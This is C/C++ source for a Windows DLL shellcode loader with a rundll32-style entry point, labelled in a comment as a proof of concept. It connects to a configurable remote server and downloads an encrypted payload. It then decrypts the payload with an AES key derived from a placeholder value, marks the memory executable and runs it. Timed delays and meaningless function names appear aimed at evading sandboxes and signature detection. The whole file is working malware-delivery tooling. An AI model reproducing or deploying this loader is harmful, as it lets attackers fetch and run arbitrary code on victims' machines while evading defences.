#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>

// Define the shellcode function signature
typedef void (*RandomA)();


static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");



static void SleepShort(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}
bool Random1(const char* Random2, int Random3, const char* Random4, char*& Random5, size_t& Random6) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return false;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        perror("Error creating socket");
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(Random3);
    serverAddress.sin_addr.s_addr = inet_addr(Random2);

    if (serverAddress.sin_addr.s_addr == INADDR_NONE) {
        perror("Invalid address/Address not supported");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        perror("Connection failed");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Send the length of the file path first
    size_t Random4Len = strlen(Random4);
    printf("Sending file path length: %zu\n", Random4Len);
    send(clientSocket, reinterpret_cast<char*>(&Random4Len), sizeof(Random4Len), 0);

    // Send the file path to the server
    printf("Sending file path: %s\n", Random4);
    send(clientSocket, Random4, Random4Len, 0);

    int fileSize;
    int bytesRead = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesRead != sizeof(fileSize)) {
        printf("Error receiving file size: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    printf("Received file size: %d\n", fileSize);
    // Receive and save the binary data in a dynamically allocated buffer
    Random5 = new char[fileSize];
    if (Random5 == nullptr) {
        printf("Error allocating memory for binary data.\n");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    size_t totalSize = 0;
    while (totalSize < fileSize) {
        bytesRead = recv(clientSocket, Random5 + totalSize, fileSize - totalSize, 0);
        if (bytesRead <= 0) {
            printf("Error receiving binary data: %d\n", WSAGetLastError());
            delete[] Random5;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        totalSize += bytesRead;
    }

    // Close the socket
    closesocket(clientSocket);

    Random6 = totalSize;
    printf("Received data size: %zu\n", Random6);

    return true;
}

int Random7(char* Random8, unsigned int Random8_len, char* Random9, size_t Random9len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)Random9, (DWORD)Random9len, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, Random8, &Random8_len)) {

        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char Random9[] = KEYVALUE;

extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    const char* Random2 = "HOSTIP";        // Replace with the actual server IP
    int Random3 = PORTY;                     // Replace with the actual server port
    const char* Random4 = "SHELLCODEFILE";   // Replace with the actual file path on the server

    char* Random5;
    size_t Random6;
	
	SleepShort(2500);
	if (Random1(Random2, Random3, Random4, Random5, Random6)) {
        printf("Binary data received successfully.\n");

        // Print received data size for debugging
        printf("Received data size: %zu\n", Random6);
	SleepShort(2300);
        Random7((char*)Random5, Random6, Random9, sizeof(Random9));

        // Allocate executable memory with READ, WRITE permissions
        LPVOID executableMemory = VirtualAlloc(NULL, Random6, MEM_COMMIT, PAGE_READWRITE);
        if (executableMemory == NULL) {
            DWORD error = GetLastError();
            printf("Error allocating executable memory: %d\n", error);
            delete[] Random5;
            return;
        }
	SleepShort(3500);
        // Copy binary data to the executable memory
        memcpy(executableMemory, Random5, Random6);
	SleepShort(3400);
        // Change the protection to PAGE_EXECUTE_READ
        DWORD oldProtect;
        if (!VirtualProtect(executableMemory, Random6, PAGE_EXECUTE_READ, &oldProtect)) {
            DWORD error = GetLastError();
            printf("Error changing memory protection: %d\n", error);
            VirtualFree(executableMemory, 0, MEM_RELEASE);
            delete[] Random5;
            return;
        }

        // Create a function pointer to the shellcode
        RandomA RandomB = reinterpret_cast<RandomA>(executableMemory);
	SleepShort(2345);
        // Call the shellcode function
        printf("Executing shellcode...\n");
        RandomB();

        // No freeing of allocated memory in this POC

        printf("Shellcode executed successfully.\n");

        // Free allocated memory
        delete[] Random5;
    } else {
        printf("Failed to receive binary data.\n");
        return;
    }
}

